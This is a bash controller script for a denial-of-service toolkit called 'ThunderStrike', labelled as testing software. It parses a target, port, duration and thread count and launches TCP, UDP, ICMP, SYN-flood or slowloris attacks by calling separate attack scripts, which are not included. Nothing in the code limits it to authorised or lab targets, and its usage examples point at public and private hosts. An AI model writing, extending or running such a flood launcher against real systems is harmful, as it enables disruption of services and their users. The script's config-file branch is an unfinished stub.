#!/bin/bash

# ThunderStrike - Advanced DoS Testing Toolkit
# Main Controller Script

# Source utilities
source utils/validator.sh
source utils/logger.sh
source utils/checker.sh
source core/banner.sh

# Global variables
TARGET=""
PORT=""
DURATION=""
METHOD=""
THREADS=""
LOGGING=false
CONFIG_FILE=""

# Display usage
usage() {
    show_banner
    echo -e "\n${CYAN}Usage: $0 [OPTIONS]${NC}"
    echo -e "${YELLOW}Options:${NC}"
    echo -e "  -m, --method    Attack method (tcp, udp, icmp, syn, slowloris)"
    echo -e "  -t, --target    Target IP address"
    echo -e "  -p, --port      Target port (default: 80)"
    echo -e "  -d, --duration  Attack duration in seconds"
    echo -e "  -r, --threads   Number of threads (default: 100)"
    echo -e "  -l, --log       Enable logging"
    echo -e "  -c, --config    Use config file"
    echo -e "  -h, --help      Show this help message"
    echo -e "\n${GREEN}Examples:${NC}"
    echo -e "  $0 -m tcp -t 192.168.1.100 -p 80 -d 60 -l"
    echo -e "  $0 -m syn -t example.com -p 443 -d 30 -r 200"
    echo -e "  $0 -c conf_attack.yaml"
    exit 1
}

# Parse command line arguments
parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -m|--method)
                METHOD="$2"
                shift 2
                ;;
            -t|--target)
                TARGET="$2"
                shift 2
                ;;
            -p|--port)
                PORT="$2"
                shift 2
                ;;
            -d|--duration)
                DURATION="$2"
                shift 2
                ;;
            -r|--threads)
                THREADS="$2"
                shift 2
                ;;
            -l|--log)
                LOGGING=true
                shift
                ;;
            -c|--config)
                CONFIG_FILE="$2"
                shift 2
                ;;
            -h|--help)
                usage
                ;;
            *)
                echo -e "${RED}Unknown option: $1${NC}"
                usage
                ;;
        esac
    done
}

# Execute attack based on method
execute_attack() {
    case $METHOD in
        tcp)
            bash core/tcp_flood.sh "$TARGET" "$PORT" "$DURATION" "$THREADS"
            ;;
        udp)
            bash core/udp_flood.sh "$TARGET" "$PORT" "$DURATION" "$THREADS"
            ;;
        icmp)
            bash core/icmp_flood.sh "$TARGET" "$DURATION" "$THREADS"
            ;;
        syn)
            bash attacks/syn_flood.sh "$TARGET" "$PORT" "$DURATION" "$THREADS"
            ;;
        slowloris)
            bash attacks/slowloris.sh "$TARGET" "$PORT" "$DURATION" "$THREADS"
            ;;
        *)
            echo -e "${RED}Invalid method: $METHOD${NC}"
            usage
            ;;
    esac
}

# Main function
main() {
    # Check dependencies first
    check_dependencies
    
    # Parse arguments
    parse_args "$@"
    
    # Handle config file
    if [[ -n "$CONFIG_FILE" ]]; then
        if [[ -f "$CONFIG_FILE" ]]; then
            echo -e "${GREEN}Loading config from: $CONFIG_FILE${NC}"
            # Config file handling would go here
            exit 0
        else
            echo -e "${RED}Config file not found: $CONFIG_FILE${NC}"
            exit 1
        fi
    fi
    
    # Validate required parameters
    if [[ -z "$METHOD" || -z "$TARGET" ]]; then
        echo -e "${RED}Error: Method and target are required${NC}"
        usage
    fi
    
    # Set defaults
    PORT=${PORT:-80}
    DURATION=${DURATION:-60}
    THREADS=${THREADS:-100}
    
    # Validate inputs
    validate_ip "$TARGET"
    validate_port "$PORT"
    validate_duration "$DURATION"
    
    # Log attack if enabled
    if [[ "$LOGGING" == true ]]; then
        log_attack "$METHOD" "$TARGET" "$PORT" "$DURATION" "$THREADS"
    fi
    
    # Execute the attack
    echo -e "${GREEN}Launching $METHOD attack against $TARGET:$PORT for $DURATION seconds...${NC}"
    execute_attack
    
    echo -e "${GREEN}Attack completed.${NC}"
}

# Run main function with all arguments
main "$@"

